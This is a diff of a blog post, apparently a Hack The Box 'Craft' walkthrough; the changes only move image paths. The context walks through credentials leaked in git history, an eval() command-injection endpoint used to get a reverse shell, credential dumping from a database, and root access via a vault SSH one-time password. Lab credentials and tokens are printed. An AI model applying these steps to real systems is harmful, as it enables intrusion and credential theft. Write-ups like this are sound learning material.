@@ -7,7 +7,7 @@ tags: [writeup, walkthrough, htb, hackthebox]
 
 Hello! It's been ages since I've updated this blog. This is a writeup for "Craft" on HTB that I have written since last November, when it was still up and running. I have totally forgotten about it until today, which I have just found out that it has been retired. It's a few months late, and there are writeups on this box everywhere, but here it is.
 
-{{< img src="/images/htb_craft/craft.png">}}
+{{< img src="/images/writeup/htb_craft/craft.png">}}
 
 <!--more-->
 
@@ -70,34 +70,34 @@ Found a webserver on 443 and ssh on 22.
 
 The webpage itself is using the domain craft.htb, and the page contains links to 'https://api.craft.htb/api/' and 'https://gogs.craft.htb/', therefore; we need to add `10.10.10.110    craft.htb api.craft.htb gogs.craft.htb` to our host file '/etc/hosts'.
 
-{{< img src="/images/htb_craft/443-home.png">}}
+{{< img src="/images/writeup/htb_craft/443-home.png">}}
 
 #### GOGS
 
 The page 'https://gogs.craft.htb/' is hosting a Git service, in which we could explore and see the contents of the repository.
 
-{{< img src="/images/htb_craft/443-gog-home.png">}}
+{{< img src="/images/writeup/htb_craft/443-gog-home.png">}}
 
-{{< img src="/images/htb_craft/443-gog-explore.png">}}
+{{< img src="/images/writeup/htb_craft/443-gog-explore.png">}}
 
 Looking through the commit history, the credential 'dinesh:4aUh0A8PbVJxgd' could be found in commit '10e3ba4f0a', and was later deleted in commit 'a2d28ed155'.
 
-{{< img src="/images/htb_craft/443-gog-creds.png">}}
+{{< img src="/images/writeup/htb_craft/443-gog-creds.png">}}
 
 In the Issues page, we found an example of endpoint calling
 `curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'`, and a warning that the new patch is dangerous.
 
-{{< img src="/images/htb_craft/443-gog-issue.png">}}
+{{< img src="/images/writeup/htb_craft/443-gog-issue.png">}}
 
 In the latest commit, a "patch" was commited, adding 'eval()' function to the brew endpoint which would process the user's input, so we could use this endpoint to execute system commands.
 
-{{< img src="/images/htb_craft/443-gog-eval.png">}}
+{{< img src="/images/writeup/htb_craft/443-gog-eval.png">}}
 
 #### API
 
 The page 'https://api.craft.htb/api/' is a swagger page showing the API documentation.
 
-{{< img src="/images/htb_craft/443-api-home.png">}}
+{{< img src="/images/writeup/htb_craft/443-api-home.png">}}
 
 Using the credential found in the git repository, a valid token could be generated using /auth/login API.
 
@@ -105,7 +105,7 @@ Using the credential found in the git repository, a valid token could be generat
 "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcyOTM2NjM2fQ.p06PEETfQsCMYcrOVk0Mo1gff4WhqbzQrFef2wZzh64"
 ```
 
-{{< img src="/images/htb_craft/443-api-token.png">}}
+{{< img src="/images/writeup/htb_craft/443-api-token.png">}}
 
 ## Exploitation
 
@@ -119,13 +119,13 @@ curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGl
 
 Using a handler, we got a reverse shell connection as root; however, after a bit of digging, it seems like we were inside a Docker container.
 
-{{< img src="/images/htb_craft/handler.png">}}
+{{< img src="/images/writeup/htb_craft/handler.png">}}
 
-{{< img src="/images/htb_craft/docker.png">}}
+{{< img src="/images/writeup/htb_craft/docker.png">}}
 
 Found some credentials in '/opt/app/craft_api/settings.py'
 
-{{< img src="/images/htb_craft/sh-creds.png">}}
+{{< img src="/images/writeup/htb_craft/sh-creds.png">}}
 
 Python was found in '/usr/local/bin', so we can add the directory to path to gain access to more commands using `export PATH=$PATH:/usr/local/bin`.
 
@@ -133,15 +133,15 @@ Found 'dbtest.py' in '/opt/app' which we could modify the query and change `curs
 
 Query: 'show databases'
 
-{{< img src="/images/htb_craft/dbs.png">}}
+{{< img src="/images/writeup/htb_craft/dbs.png">}}
 
 Query: 'show tables'
 
-{{< img src="/images/htb_craft/tables.png">}}
+{{< img src="/images/writeup/htb_craft/tables.png">}}
 
 Query: 'select * from user'
 
-{{< img src="/images/htb_craft/user.png">}}
+{{< img src="/images/writeup/htb_craft/user.png">}}
 
 We found multiple credentials which are:
 
@@ -153,30 +153,30 @@ gilfoyle:ZEU3N8WNM2rh4T
 
 Using the credential 'gilfoyle:ZEU3N8WNM2rh4T', we could log into GOG and see the private repository named 'craft-intra'.
 
-{{< img src="/images/htb_craft/443-gog-private.png">}}
+{{< img src="/images/writeup/htb_craft/443-gog-private.png">}}
 
 In the repository, a private key and public key pair could be found.
 
-{{< img src="/images/htb_craft/443-gog-key.png">}}
+{{< img src="/images/writeup/htb_craft/443-gog-key.png">}}
 
 ๊Using the private key, we can ssh to the target with the credential 'gilfoyle:ZEU3N8WNM2rh4T'
 
-{{< img src="/images/htb_craft/ssh.png">}}
+{{< img src="/images/writeup/htb_craft/ssh.png">}}
 
 Got the user flag.
 
-{{< img src="/images/htb_craft/proof-user-blur.png">}}
+{{< img src="/images/writeup/htb_craft/proof-user-blur.png">}}
 
 ## Privilege Escalation
 
 From the GGO, there is a vault configuration file, enabling ssh secret with the role 'root_opt' that has root permission.
 
-{{< img src="/images/htb_craft/vault-secret.png">}}
+{{< img src="/images/writeup/htb_craft/vault-secret.png">}}
 
 Using `vault ssh -role root_otp -mode otp root@127.0.0.1`, we could ssh to the target server itself and gain root with vault OTP.
 
-{{< img src="/images/htb_craft/root.png">}}
+{{< img src="/images/writeup/htb_craft/root.png">}}
 
 OWNED!
 
-{{< img src="/images/htb_craft/proof-root-blur.png">}}
+{{< img src="/images/writeup/htb_craft/proof-root-blur.png">}}
